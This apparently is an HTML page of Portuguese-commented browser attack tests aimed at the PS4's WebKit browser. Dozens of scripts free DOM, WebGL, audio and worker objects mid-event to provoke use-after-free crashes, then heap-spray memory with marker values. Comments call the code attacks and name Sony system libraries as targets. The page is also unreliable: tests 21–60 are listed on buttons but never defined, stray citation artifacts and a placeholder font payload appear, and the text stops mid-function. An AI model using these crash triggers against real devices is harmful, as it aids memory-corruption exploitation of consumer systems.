<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v740000: API Chaos</title>

</head>
<body>

<h1>v740000: API CHAOS (NO ALERTS)</h1>
<div id="log">Status: Aguardando...</div>

<button class="btn" onclick="run(t01)">01. onResize + deleteCaption</button>
<button class="btn" onclick="run(t02)">02. onSelect + deleteContents</button>
<button class="btn" onclick="run(t03)">03. onPageHide + adoptNode</button>
<button class="btn" onclick="run(t04)">04. onWebKitAnimationEnd + suspendRedraw</button>
<button class="btn" onclick="run(t05)">05. onWebKitTransitionEnd + deleteRule</button>
<button class="btn" onclick="run(t06)">06. onMessage + terminate()</button>
<button class="btn" onclick="run(t07)">07. IDB Transaction + deleteObjectStore</button>
<button class="btn" onclick="run(t08)">08. onDrag + detach() (SVG Matrix)</button>
<button class="btn" onclick="run(t09)">09. putImageData + innerHTML</button>
<button class="btn" onclick="run(t10)">10. onAnimationIteration + insertAdjacentHTML</button>
<button class="btn" onclick="run(t11)">11. onWebKitFullscreenChange + deleteRow</button>
<button class="btn" onclick="run(t12)">12. onCanPlayThrough + detach</button>
<button class="btn" onclick="run(t13)">13. onStorage + closeBrowsingContext</button>
<button class="btn" onclick="run(t14)">14. onResize + deleteTexture (Simulado)</button>
<button class="btn" onclick="run(t15)">15. onScroll + createDocumentFragment</button>
<button class="btn" onclick="run(t16)">16. onScroll + deleteTHead</button>
<button class="btn" onclick="run(t17)">17. onDragEnd + outerHTML</button>
<button class="btn" onclick="run(t18)">18. onHashChange + Range.detach</button>
<button class="btn" onclick="run(t19)">19. onPageShow + createDocumentFragment</button>
<button class="btn" onclick="run(t20)">20. onTouchStart + deleteCaption</button>
<button class="btn" onclick="run(t21)">21. onMessage (Binary) + ws.close()</button>
<button class="btn" onclick="run(t22)">22. onPointerDown + target.remove()</button>
<button class="btn" onclick="run(t23)">23. onPopState + history.pushState Loop</button>
<button class="btn" onclick="run(t24)">24. SVG Path API + path.remove()</button>
<button class="btn" onclick="run(t25)">25. onResize + insertRule/disabled</button>
<button class="btn" onclick="run(t26)">26. onEmptied + ScriptProcessor Kill</button>
<button class="btn" onclick="run(t27)">27. Worker Message + deleteDatabase</button>
<button class="btn" onclick="run(t28)">28. onDragEnter + Iframe Detach</button>
<button class="btn" onclick="run(t29)">29. onAnimationStart + adoptNode</button>
<button class="btn" onclick="run(t30)">30. onHashChange + getScreenCTM</button>
<button class="btn" onclick="run(t31)">31. MessageChannel + Worker.terminate()</button>
<button class="btn" onclick="run(t32)">32. onPageHide + document.documentElement.remove()</button>
<button class="btn" onclick="run(t33)">33. SVG &lt;animate&gt; onbegin + remove()</button>
<button class="btn" onclick="run(t34)">34. fetch() stream + URL.revokeObjectURL</button>
<button class="btn" onclick="run(t35)">35. onContextRestored + Canvas Detach</button>
<button class="btn" onclick="run(t36)">36. Link Import + remove()</button>
<button class="btn" onclick="run(t37)">37. Blob.slice() + Revoke Parent</button>
<button class="btn" onclick="run(t38)">38. onTimeUpdate + TextTrack.removeCue</button>
<button class="btn" onclick="run(t39)">39. FormData Recursive Append</button>
<button class="btn" onclick="run(t40)">40. requestAnimationFrame + Nuke DOM</button>
<button class="btn" onclick="run(t41)">41. createHTMLDocument + location.reload</button>
<button class="btn" onclick="run(t42)">42. canvas.measureText + Font delete</button>
<button class="btn" onclick="run(t43)">43. Range.surroundContents + node.remove</button>
<button class="btn" onclick="run(t44)">44. gl.linkProgram + gl.deleteShader</button>
<button class="btn" onclick="run(t45)">45. Nested Worker + Blob Revoke</button>
<button class="btn" onclick="run(t46)">46. MediaSource.endOfStream + revoke</button>
<button class="btn" onclick="run(t47)">47. SVG feTurbulence + removeAttribute</button>
<button class="btn" onclick="run(t48)">48. ColSpan Merge + deleteCell</button>
<button class="btn" onclick="run(t49)">49. Recursive postMessage + terminate</button>
<button class="btn" onclick="run(t50)">50. FontFaceSet.add/delete Loop</button>
<button class="btn" onclick="run(t51)">51. XSLT transformToFragment + Node Removal</button>
<button class="btn" onclick="run(t52)">52. PannerNode setPosition + disconnect</button>
<button class="btn" onclick="run(t53)">53. Selection.modify + deleteFromDocument</button>
<button class="btn" onclick="run(t54)">54. createSVGPathSegClosePath + clear()</button>
<button class="btn" onclick="run(t55)">55. MediaList.deleteMedium + matchMedia</button>
<button class="btn" onclick="run(t56)">56. forceRedraw() + suspendRedraw()</button>
<button class="btn" onclick="run(t57)">57. onReset + adoptNode()</button>
<button class="btn" onclick="run(t58)">58. matchMedia + deleteMedium()</button>
<button class="btn" onclick="run(t59)">59. createSVGPathSegClosePath Loop</button>
<button class="btn" onclick="run(t60)">60. releaseEvents() + window.close()</button>
<button class="btn" onclick="run(w61)">61. decodeAudioData + close()</button>
<button class="btn" onclick="run(w62)">62. getGamepads() + Event Spam</button>
<button class="btn" onclick="run(w63)">63. document.fonts.delete() + Render</button>
<button class="btn" onclick="run(w64)">64. bufferSubData + deleteBuffer</button>
<button class="btn" onclick="run(w65)">65. XHR ResponseType Blob + Revoke</button>

<div id="stage"></div>

<script>
    const stage = document.getElementById('stage');
    const log = document.getElementById('log');
    let spray = [];

    function run(func) {
        stage.innerHTML = "";
        spray = [];
        log.innerText = "Executando: " + func.name;
        func();
    }

    // =================================================================
    // 01. Table Layout Race
    // Evento: onresize 
    // API: deleteCaption 
    // Lógica: Força um redimensionamento (layout recalc) e remove a legenda
    // da tabela no meio do processo.
    // =================================================================
    function t01() {
        const table = document.createElement('table');
        table.style.width = "100%";
        table.border = "1";
        const caption = table.createCaption();
        caption.innerText = "ALVO DE LAYOUT";
        stage.appendChild(table);

        const frame = document.createElement('iframe');
        stage.appendChild(frame);

        // Usa o resize do iframe para disparar o evento repetidamente
        frame.contentWindow.onresize = () => {
            try {
                // Ação destrutiva durante o cálculo de geometria
                table.deleteCaption(); 
                
                // Spray imediato para preencher o vazio
                spray.push(new Uint32Array(1024).fill(0x41414141));
                
                log.innerText = "Caption Deleted during Resize";
            } catch(e) {}
        };

        // Trigger: Redimensiona o iframe via JS
        setInterval(() => {
            frame.width = (Math.random() * 500) + "px";
        }, 10);
    }

    // =================================================================
    // 02. Selection Memory Corruption
    // Evento: onselect 
    // API: deleteContents 
    // Lógica: O usuário (ou script) seleciona texto. O evento dispara.
    // Nós deletamos a memória do Range selecionado imediatamente.
    // =================================================================
    function t02() {
        const input = document.createElement('input');
        input.value = "SELECIONE ESTE TEXTO PARA CRASH";
        input.style.width = "100%";
        stage.appendChild(input);

        input.onselect = () => {
            // Cria um Range correspondente
            const range = document.createRange();
            range.selectNode(input);
            
            // Ação destrutiva: Apaga o conteúdo que está sendo destacado
            try {
                range.deleteContents();
                input.remove(); // Remove o nó pai também
                
                // Heap Spray
                for(let i=0; i<1000; i++) spray.push(new Float64Array(100));
                log.innerText = "Contents Deleted during Selection";
            } catch(e){}
        };

        // Auto-trigger
        setTimeout(() => {
            input.focus();
            input.setSelectionRange(0, 10);
        }, 500);
    }

    // =================================================================
    // 03. Node Adoption UAF (Cross-Document)
    // Evento: onpagehide 
    // API: adoptNode 
    // Lógica: Quando um iframe está fechando (pagehide), tentamos roubar
    // (adotar) um nó dele para o documento principal.
    // =================================================================
    function t03() {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const target = doc.createElement('div');
            target.innerText = "EU SOU ADOTADO";
            doc.body.appendChild(target);

            ifr.contentWindow.onpagehide = () => {
                // Ação destrutiva: Mover nó de um documento moribundo
                try {
                    document.adoptNode(target);
                    stage.appendChild(target);
                    
                    spray.push(new ArrayBuffer(1024*1024));
                    log.innerText = "Node Adopted from dying frame";
                } catch(e) {}
            };

            // Trigger: Navegar o iframe para fora
            setTimeout(() => {
                ifr.contentWindow.location.reload();
            }, 500);
        };
    }

    // =================================================================
    // 04. SVG Render Stop
    // Evento: onwebkitanimationend 
    // API: suspendRedraw / unsusrpendRedraw 
    // Lógica: Ao fim de uma animação CSS, suspendemos o desenho do SVG
    // e removemos o elemento.
    // =================================================================
    function t04() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        
        // Configura animação CSS no SVG
        rect.style.transition = "all 0.1s";
        rect.style.fill = "red";
        rect.setAttribute("width", 100); rect.setAttribute("height", 100);
        
        svg.appendChild(rect);
        stage.appendChild(svg);

        rect.addEventListener("webkitTransitionEnd", () => {
            try {
                // Ação destrutiva: Pausa o motor de render do SVG
                svg.suspendRedraw(1000);
                
                // Remove o elemento
                rect.remove();
                
                // Força redraw num estado inválido
                svg.unsuspendRedraw(); 
                
                log.innerText = "SVG Redraw suspended and resumed on invalid state";
            } catch(e){}
        });

        // Trigger
        setTimeout(() => { rect.style.fill = "blue"; }, 100);
    }

    // =================================================================
    // 05. CSS Rule Destruction
    // Evento: onwebkittransitionend 
    // API: deleteRule 
    // Lógica: Uma transição CSS termina. O motor tenta limpar o estado.
    // Nós deletamos a regra CSS que definia a transição.
    // =================================================================
    function t05() {
        const style = document.createElement('style');
        style.textContent = ".anim-target { width: 100px; transition: width 0.5s; }";
        document.head.appendChild(style);
        
        const d = document.createElement('div');
        d.className = "anim-target";
        stage.appendChild(d);

        d.addEventListener("webkitTransitionEnd", () => {
            try {
                // Ação destrutiva: Deleta a regra CSS do Style Sheet
                style.sheet.deleteRule(0);
                
                // Remove o elemento do DOM
                d.remove();
                
                // Spray
                spray.push(new Uint32Array(5000).fill(0xDEADBEEF));
                log.innerText = "CSS Rule deleted after transition";
            } catch(e) {}
        });

        // Trigger
        setTimeout(() => { d.style.width = "500px"; }, 100);
    }
// =================================================================
    // 06. Worker Terminate Race
    // Evento: onmessage 
    // API: terminate 
    // Lógica: O Worker envia dados pesados. Assim que o evento 'onmessage'
    // dispara na thread principal, terminamos o worker violentamente.
    // =================================================================
    function t06() {
        const code = `
            const buf = new Uint8Array(1024*1024*10); // 10MB
            setInterval(() => {
                postMessage({data: buf}, [buf.buffer]); // Transferable
            }, 10);
        `;
        const blob = new Blob([code], {type: 'application/javascript'});
        const worker = new Worker(URL.createObjectURL(blob));

        worker.onmessage = (e) => {
            try {
                // AÇÃO DESTRUTIVA
                // Mata a thread do worker enquanto ela está transferindo memória
                worker.terminate(); 
                
                // Tenta ler o buffer órfão
                const deadData = e.data.data[0];
                
                log.innerText = "Worker Terminated during transfer";
                spray.push(new ArrayBuffer(1024*1024));
            } catch(e) {}
        };
    }

    // =================================================================
    // 07. IndexedDB Store Destruction
    // Evento: Transaction Loop (implícito)
    // API: deleteObjectStore 
    // Lógica: Abre uma transação de banco de dados e tenta deletar a
    // 'ObjectStore' (tabela) enquanto tenta escrever nela.
    // =================================================================
    function t07() {
        const req = indexedDB.open("ChaosDB", Math.random());
        
        req.onupgradeneeded = (e) => {
            const db = e.target.result;
            const store = db.createObjectStore("store1");
            
            // Loop de escrita
            for(let i=0; i<100; i++) store.put("data"+i, i);
            
            // AÇÃO DESTRUTIVA
            // Remove a tabela (Store) no meio da transação de upgrade
            try {
                db.deleteObjectStore("store1");
                log.innerText = "ObjectStore deleted during population";
            } catch(e) {}
        };
    }

    // =================================================================
    // 08. SVG Transform Detach
    // Evento: ondrag  (Simulado)
    // API: createSVGMatrix  + detach 
    // Lógica: Cria matrizes de transformação SVG complexas e desanexa o nó
    // durante o cálculo de arraste.
    // =================================================================
    function t08() {
        const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        const g = document.createElementNS("http://www.w3.org/2000/svg", "g");
        svg.appendChild(g);
        stage.appendChild(svg);
        
        // Simula evento de drag repetitivo
        let intervals = 0;
        const loop = setInterval(() => {
            intervals++;
            if(intervals > 1000) clearInterval(loop);

            // Cria matriz de transformação
            const matrix = svg.createSVGMatrix(); 
            const transform = svg.createSVGTransform();
            transform.setMatrix(matrix);
            
            // AÇÃO DESTRUTIVA
            // Aplica a transformação e imediatamente desanexa o nó
            // O motor de renderização tenta aplicar a matriz em um nó sem pai
            try {
                g.transform.baseVal.appendItem(transform);
                
                // 'detach' é uma API antiga de Range, mas aqui usamos remove()
                // que tem efeito similar de 'detach' no DOM moderno
                g.remove(); 
                stage.appendChild(g); // Reanexa para continuar o loop de stress
            } catch(e) {}
        }, 5);
        
        log.innerText = "SVG Matrix calculation on detached node";
    }

    // =================================================================
    // 09. Canvas Buffer Overflow
    // Evento: Loop de render
    // API: putImageData  + innerHTML 
    // Lógica: Manipula pixels brutos do Canvas e destrói o canvas via
    // innerHTML no meio da pintura.
    // =================================================================
    function t09() {
        const c = document.createElement('canvas');
        c.width = 100; c.height = 100;
        stage.appendChild(c);
        const ctx = c.getContext('2d');
        
        // Cria buffer de imagem (ruído)
        const imgData = ctx.createImageData(100, 100);
        for (let i = 0; i < imgData.data.length; i += 4) {
            imgData.data[i] = 255; // Red
            imgData.data[i+3] = 255; // Alpha
        }

        const loop = setInterval(() => {
            try {
                // Coloca dados de imagem (Operação pesada de CPU->GPU)
                ctx.putImageData(imgData, 0, 0);
                
                // AÇÃO DESTRUTIVA
                // Limpa o container, destruindo o Canvas 'c' imediatamente
                // Se o driver GPU estiver lendo 'imgData' para 'c', isso causa falha
                stage.innerHTML = "";
                
                // Recria para o loop continuar estressando
                stage.appendChild(c);
            } catch(e) { clearInterval(loop); }
        }, 10);
        
        log.innerText = "Canvas pixel buffer race";
    }

    // =================================================================
    // 10. DOM Insertion Flood
    // Evento: onanimationiteration 
    // API: insertAdjacentHTML 
    // Lógica: Usa uma animação CSS rápida para disparar eventos JS.
    // A cada iteração, injeta HTML massivo adjacente.
    // =================================================================
    function t10() {
        const d = document.createElement('div');
        d.className = "spinner";
        stage.appendChild(d);

        d.addEventListener("animationiteration", () => {
            // AÇÃO DESTRUTIVA E EXPANSIVA
            // Injeta HTML cru antes do elemento animado
            // Isso força o navegador a realocar memória do DOM layout repetidamente
            try {
                d.insertAdjacentHTML('beforebegin', '<span>A</span>'.repeat(1000));
                
                // Limpa periodicamente para não travar por falta de RAM simples (OOM),
                // queremos crash por corrupção, não por memória cheia.
                if(stage.children.length > 500) stage.textContent = "";
                stage.appendChild(d); // Mantém o gerador vivo
                
                log.innerText = "High freq DOM injection";
            } catch(e) {}
        });
    }
// =================================================================
    // 11. Fullscreen Table Crash
    [cite_start]// Evento: onwebkitfullscreenchange [cite: 1]
    [cite_start]// API: deleteRow [cite: 4]
    // Lógica: O evento de fullscreen força o navegador a recalcular o layout da página
    // para o tamanho da TV. Tabelas são objetos complexos. Se removermos linhas
    // durante esse recálculo crítico, podemos causar um crash de layout.
    // =================================================================
    function t11() {
        const table = document.createElement('table');
        table.style.width = "100%";
        table.border = "1";
        // Cria estrutura pesada para forçar tempo de processamento
        for(let i=0; i<100; i++) {
            const r = table.insertRow();
            r.insertCell().innerText = "DATA " + i;
        }
        stage.appendChild(table);

        document.onwebkitfullscreenchange = () => {
            try {
                // AÇÃO DESTRUTIVA
                // Remove todas as linhas enquanto o renderizador tenta desenhá-las em Fullscreen
                while(table.rows.length > 0) table.deleteRow(0);
                
                // Spray para ocupar a memória liberada pelas células
                spray.push(new Float64Array(5000));
                log.innerText = "Table rows deleted during Fullscreen transition";
            } catch(e) {}
        };

        // Trigger: Tenta entrar em fullscreen
        if(stage.webkitRequestFullscreen) stage.webkitRequestFullscreen();
    }

    // =================================================================
    // 12. Media Pipeline Detach
    [cite_start]// Evento: oncanplaythrough [cite: 2]
    [cite_start]// API: detach (Simulado via remove/src=null) [cite: 5]
    // Lógica: O evento 'canplaythrough' indica que o buffer de mídia está cheio e pronto.
    // O módulo proprietário da Sony (libSceAvPlayer) está ativo. Desanexar o nó agora
    // pode deixar o player órfão na memória.
    // =================================================================
    function t12() {
        const v = document.createElement('video');
        // Usa um blob ou URL válida para engajar o driver
        v.src = "http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4";
        v.preload = "auto";
        stage.appendChild(v);

        v.oncanplaythrough = () => {
            try {
                // AÇÃO DESTRUTIVA
                // Remove do DOM e limpa a fonte.
                // 'detach' é um conceito interno, 'remove' é a API JS.
                v.remove();
                v.src = "";
                
                // Força Garbage Collection com alocação massiva
                spray.push(new ArrayBuffer(1024 * 1024 * 5));
                log.innerText = "Video detached during buffer ready state";
            } catch(e) {}
        };
        
        // Se o evento demorar, força reload do src
        setTimeout(() => v.load(), 1000);
    }

    // =================================================================
    // 13. Window Context Kill
    [cite_start]// Evento: onstorage [cite: 1]
    [cite_start]// API: close (closeBrowsingContext) [cite: 4]
    // Lógica: Usa iframes para gerar eventos de Storage (comunicação entre janelas).
    // Quando o evento chega, fechamos a janela que o enviou, corrompendo a ponte IPC.
    // =================================================================
    function t13() {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        window.onstorage = (e) => {
            try {
                // AÇÃO DESTRUTIVA
                // Fecha o contexto de navegação do iframe imediatamente
                ifr.contentWindow.close();
                ifr.remove();
                
                log.innerText = "Browsing Context closed on storage event";
                spray.push(new Uint32Array(1024));
            } catch(e) {}
        };

        // Trigger: Iframe escreve no storage
        setTimeout(() => {
            ifr.contentWindow.localStorage.setItem("trigger", Math.random());
        }, 500);
    }

    // =================================================================
    // 14. WebGL Texture Delete Race
    [cite_start]// Evento: onresize [cite: 1]
    [cite_start]// API: deleteTexture [cite: 5]
    // Lógica: O redimensionamento do canvas força a realocação do buffer gráfico.
    // Se deletarmos a textura ativa durante esse processo, o driver GPU (libSceGnm)
    // pode tentar ler de um endereço de memória inválido.
    // =================================================================
    function t14() {
        const c = document.createElement('canvas');
        stage.appendChild(c);
        const gl = c.getContext('webgl');
        
        if(!gl) { log.innerText = "WebGL não suportado"; return; }

        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array([0, 0, 255, 255]));

        // Trigger via redimensionamento contínuo
        let growing = true;
        const loop = setInterval(() => {
            c.width = growing ? c.width + 1 : c.width - 1;
            if(c.width > 200) growing = false;
            
            // Simula o evento onresize (ou usa o nativo se anexado a window)
            try {
                // AÇÃO DESTRUTIVA
                // Deleta a textura que está bindada
                gl.deleteTexture(tex);
                
                // Tenta desenhar imediatamente após deletar
                gl.drawArrays(gl.TRIANGLES, 0, 3);
                
                log.innerText = "Texture deleted during resize/draw";
                clearInterval(loop); // Para após o ataque
            } catch(e) {}
        }, 20);
    }

    // =================================================================
    // 15. Fragment Adoption Storm
    [cite_start]// Evento: onscroll [cite: 1]
    [cite_start]// API: createDocumentFragment + adoptNode [cite: 6]
    // Lógica: Dispara milhares de vezes ao rolar. Movemos nós do DOM principal
    // para um fragmento de documento (memória fora da árvore) repetidamente.
    // Isso estressa o gerenciamento de nós do WebKit.
    // =================================================================
    function t15() {
        const d = document.createElement('div');
        d.style.height = "2000px"; // Força scroll
        d.innerHTML = "<span>ALVO </span>".repeat(500);
        stage.appendChild(d);
        
        const fragment = document.createDocumentFragment();

        stage.onscroll = () => {
            // Pega um nó filho aleatório
            const target = d.children[0];
            if(!target) return;

            try {
                // AÇÃO DESTRUTIVA
                // 'adoptNode' move o nó do documento atual para o fragmento (ou outro doc)
                // Isso muda o 'ownerDocument' do nó internamente.
                document.adoptNode(target);
                fragment.appendChild(target);
                
                log.innerText = "Node adopted to fragment during scroll";
            } catch(e) {}
        };

        // Trigger: Scroll automático
        let s = 0;
        setInterval(() => {
            stage.scrollTop = s++;
        }, 5);
    }
 // =================================================================
    // 61. Audio Context Race
    // Alvo: libSceAudioOut (Driver de Áudio do PS4)
    // API: decodeAudioData + AudioContext.close()
    // Lógica: O PS4 usa hardware dedicado para decodificação de áudio.
    // Iniciamos a decodificação de um buffer e fechamos o contexto de áudio
    // violentamente antes do hardware retornar o resultado.
    // =================================================================
    function w61() {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        
        // Cria um buffer de "ruído" para decodificar
        const buffer = new ArrayBuffer(1024 * 1024); // 1MB
        
        // Inicia a decodificação (Assíncrono no hardware)
        ctx.decodeAudioData(buffer).then(() => {
            log.innerText = "Decoded (Falha no Race)";
        }, () => {
            log.innerText = "Decode Error (Esperado)";
        });

        // AÇÃO DESTRUTIVA
        // Fecha o canal de áudio imediatamente. 
        // O driver de áudio pode tentar escrever o resultado num contexto fechado.
        setTimeout(() => {
            ctx.close();
            log.innerText = "AudioContext Closed during decode";
            
            // Spray para pegar ponteiros de áudio soltos
            spray.push(new Float32Array(10000));
        }, 0);
    }

    // =================================================================
    // 62. Gamepad Polling Flood
    // Alvo: libScePad (Driver do DualShock 4)
    // API: navigator.getGamepads()
    // Lógica: O navegador do PS4 tem acesso direto ao controle.
    // Fazemos um loop de polling agressivo enquanto simulamos eventos de conexão,
    // tentando exaurir o buffer de entrada do sistema.
    // =================================================================
    function w62() {
        // Dispara eventos falsos de conexão para acordar o driver
        window.dispatchEvent(new GamepadEvent('gamepadconnected', {
            gamepad: { index: 0, id: "DualShock 4" }
        }));

        const loop = setInterval(() => {
            // Polling de alta frequência (Stress no libScePad)
            const pads = navigator.getGamepads();
            
            // AÇÃO: Tenta acessar propriedades de vibração (Haptic) se disponível
            // ou apenas ler dados brutos massivamente
            if(pads[0]) {
                const axes = pads[0].axes;
                // Cria pressão de memória no heap de input
                spray.push(new Float64Array(axes));
            }
            
            // Se o navegador travar aqui, é um DoS no driver de entrada
            if(spray.length > 5000) {
                clearInterval(loop);
                log.innerText = "Gamepad Buffer Full";
            }
        }, 1); // 1ms loop
    }

    // =================================================================
    // 63. Font Loading Race
    // Alvo: libSceFont (Renderizador de Texto)
    // API: document.fonts.delete()
    // Lógica: O PS4 renderiza fontes em um módulo separado.
    // Adicionamos uma fonte, forçamos o render de texto com ela, e a deletamos
    // do FontFaceSet enquanto os pixels estão sendo desenhados.
    // =================================================================
    function w63() {
        const d = document.createElement('div');
        d.style.fontFamily = "'CrashFont'";
        d.innerText = "FONT RENDERING RACE ".repeat(100);
        stage.appendChild(d);

        const f = new FontFace('CrashFont', 'url(data:font/woff;base64,AAA...)');
        document.fonts.add(f);
        
        // Força carregamento
        f.load().then(() => {
            // Assim que carregar e começar a pintar...
            
            // AÇÃO DESTRUTIVA
            // Remove a fonte do registro global
            document.fonts.delete(f);
            
            // Força um "Reflow" (Recálculo de layout) imediato
            // O renderizador vai procurar a fonte 'CrashFont' e encontrar nulo
            d.style.zoom = 1.0001;
            
            log.innerText = "Font deleted during paint";
            spray.push(new Uint8Array(1024*1024));
        });
    }

    // =================================================================
    // 64. WebGL Buffer SubData Race
    // Alvo: libSceGnm (Memória de Vídeo Compartilhada)
    // API: bufferSubData + deleteBuffer
    // Lógica: Envia dados para a GPU e deleta o buffer de destino no meio da transferência.
    // Diferente de texturas, buffers são memória bruta e causam crashes mais violentos.
    // =================================================================
    function w64() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        if(!gl) return;

        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        // Aloca 1MB na GPU
        gl.bufferData(gl.ARRAY_BUFFER, 1024*1024, gl.DYNAMIC_DRAW);

        const data = new Uint8Array(1024*100).fill(0xCC);

        // Loop de escrita
        const loop = setInterval(() => {
            try {
                // Escreve dados parciais
                gl.bufferSubData(gl.ARRAY_BUFFER, 0, data);
                
                // AÇÃO DESTRUTIVA (Race Condition)
                // Deleta o buffer na CPU enquanto a GPU processa o comando anterior
                // Em arquiteturas de memória unificada (como PS4), isso é fatal.
                gl.deleteBuffer(buf);
                
                clearInterval(loop);
                log.innerText = "Buffer deleted during subData upload";
            } catch(e) {}
        }, 0);
    }

    // =================================================================
    // 65. XHR Blob Revoke
    // Alvo: Network Buffer Management
    // API: XMLHttpRequest (responseType='blob') + URL.revokeObjectURL
    // Lógica: Baixa um arquivo grande como Blob. No momento que o download termina
    // e o blob é criado, revogamos a URL e limpamos a resposta XHR.
    // =================================================================
    function w65() {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://www.google.com/favicon.ico?' + Math.random());
        xhr.responseType = 'blob';

        xhr.onload = () => {
            const blob = xhr.response;
            const url = URL.createObjectURL(blob);
            
            // Cria elemento usando o blob
            const img = document.createElement('img');
            img.src = url;
            stage.appendChild(img);

            // AÇÃO DESTRUTIVA
            // Revoga a URL enquanto a imagem está decodificando
            URL.revokeObjectURL(url);
            
            // Aborta XHR e limpa referências para forçar GC no Blob
            xhr.abort();
            
            log.innerText = "Blob revoked during image decode";
            spray.push(new ArrayBuffer(1024*1024));
        };
        
        xhr.send();
    }
// =================================================================
    // 16. Scroll Layout Thrashing
    // Evento: onscroll (Dispara múltiplas vezes por segundo)
    // API: deleteTHead (Destruição de layout de tabela)
    // Lógica: Ao rolar a página, o navegador precisa redesenhar a tabela se ela
    // tiver cabeçalhos fixos ou complexos. Deletar o cabeçalho durante esse
    // cálculo confunde o motor de renderização.
    // =================================================================
    function t16() {
        const table = document.createElement('table');
        table.border = "1";
        table.style.width = "100%";
        
        // Cria cabeçalho complexo
        const thead = table.createTHead();
        const row = thead.insertRow();
        const cell = row.insertCell();
        cell.innerText = "CABEÇALHO VOLÁTIL";
        cell.style.height = "100px";
        cell.style.background = "red";
        
        // Corpo longo para permitir scroll
        const tbody = table.createTBody();
        for(let i=0; i<50; i++) {
            const r = tbody.insertRow();
            r.insertCell().innerText = "Linha " + i;
        }
        
        stage.appendChild(table);

        // GATILHO
        stage.onscroll = () => {
            try {
                // Ação Destrutiva: Remove o cabeçalho que o navegador está tentando renderizar
                table.deleteTHead();
                
                // Remove o listener para não travar o log, mas o dano já foi feito
                stage.onscroll = null;
                
                log.innerText = "THead deleted during scroll layout";
                spray.push(new Float64Array(1000));
            } catch(e) {}
        };

        // Auto-scroll para disparar
        setTimeout(() => {
            stage.scrollTop = 50;
        }, 500);
    }

    // =================================================================
    // 17. Drag Drop Replacement
    // Evento: ondragend (Fim de operação de arrastar)
    // API: outerHTML (Substitui o próprio elemento na memória)
    // Lógica: O sistema operacional informa que o arraste terminou. O navegador
    // tenta atualizar o elemento fonte, mas nós o substituímos por outro objeto.
    // =================================================================
    function t17() {
        const d = document.createElement('div');
        d.draggable = true;
        d.innerText = "ARRASTE-ME (DRAG TARGET)";
        d.style.background = "orange";
        d.style.padding = "20px";
        d.style.cursor = "move";
        stage.appendChild(d);

        d.ondragend = () => {
            try {
                // Ação Destrutiva
                // Substitui o objeto JS 'd' por HTML puro, matando a referência original
                d.outerHTML = "<h1>ELEMENTO SUBSTITUÍDO</h1>";
                
                log.innerText = "Drag source replaced via outerHTML";
                spray.push(new Uint32Array(5000).fill(0xDEADBEEF));
            } catch(e) {}
        };

        // Simula evento (já que arrastar no controle é difícil)
        setTimeout(() => {
            d.dispatchEvent(new Event("dragend"));
        }, 500);
    }

    // =================================================================
    // 18. Hash Nav Memory Leak
    // Evento: onhashchange (Navegação interna #)
    // API: Range.detach() (Manual Memory Management)
    // Lógica: 'detach()' é uma API obsoleta que força a liberação de memória de Ranges.
    // Usá-la durante uma navegação de hash (que usa Ranges internamente para
    // encontrar o alvo do scroll) pode causar Use-After-Free.
    // =================================================================
    function t18() {
        const target = document.createElement('div');
        target.id = "destino";
        target.innerText = "DESTINO DO HASH";
        target.style.marginTop = "1000px";
        stage.appendChild(target);

        // Cria um Range apontando para o destino
        const range = document.createRange();
        range.selectNode(target);

        window.onhashchange = () => {
            try {
                // Ação Destrutiva
                // Diz ao navegador que este range é inválido agora
                range.detach(); 
                
                // Remove o alvo físico também
                target.remove();
                
                log.innerText = "Range detached during hash navigation";
                spray.push(new ArrayBuffer(1024 * 1024));
            } catch(e) {}
        };

        // Dispara navegação
        setTimeout(() => {
            window.location.hash = "destino";
        }, 500);
    }

    // =================================================================
    // 19. Lifecycle Node Moving
    // Evento: onpageshow (Disparado ao carregar/restaurar página)
    // API: createDocumentFragment (Memória fora do DOM)
    // Lógica: Quando um iframe é carregado/exibido, tentamos mover seus nós
    // para um fragmento de memória isolado, confundindo o ciclo de vida.
    // =================================================================
    function t19() {
        const ifr = document.createElement('iframe');
        stage.appendChild(ifr);

        ifr.onload = () => {
            const doc = ifr.contentDocument;
            const div = doc.createElement('div');
            div.innerText = "LIFECYCLE TARGET";
            doc.body.appendChild(div);

            // GATILHO NO IFRAME
            ifr.contentWindow.onpageshow = () => {
                try {
                    // Ação Destrutiva
                    // Arranca o elemento do documento ativo e joga num fragmento "frio"
                    const frag = doc.createDocumentFragment();
                    frag.appendChild(div); 
                    
                    log.innerText = "Node moved to fragment on pageshow";
                    spray.push(new Uint32Array(1024));
                } catch(e) {}
            };
            
            // Força recarga para disparar pageshow
            ifr.contentWindow.location.reload();
        };
    }

    // =================================================================
    // 20. Touch Hit Testing
    // Evento: ontouchstart (Entrada de toque/ponteiro)
    // API: deleteCaption (Modificação de Tabela)
    // Lógica: "Hit Testing" é o processo de descobrir onde você clicou.
    // Se você clicar na legenda (Caption) e ela for deletada *durante* o processamento
    // do clique, o navegador perde a referência do objeto sob o cursor.
    // =================================================================
    function t20() {
        const table = document.createElement('table');
        const cap = table.createCaption();
        cap.innerText = "TOQUE AQUI (CAPTION)";
        cap.style.background = "blue";
        cap.style.padding = "20px";
        cap.style.color = "white";
        cap.style.cursor = "pointer";
        stage.appendChild(table);

        // GATILHO
        cap.ontouchstart = () => {
            try {
                // Ação Destrutiva
                // O ponteiro ainda está "pressionado" sobre o caption, mas nós o deletamos.
                table.deleteCaption();
                
                log.innerText = "Caption deleted under touch point";
                spray.push(new Float64Array(5000));
            } catch(e) {}
        };
        
        // Fallback para mouse (caso teste com controle/mouse)
        cap.onmousedown = cap.ontouchstart;

        // Simula o toque via evento sintético
        setTimeout(() => {
            const ev = new Event("touchstart");
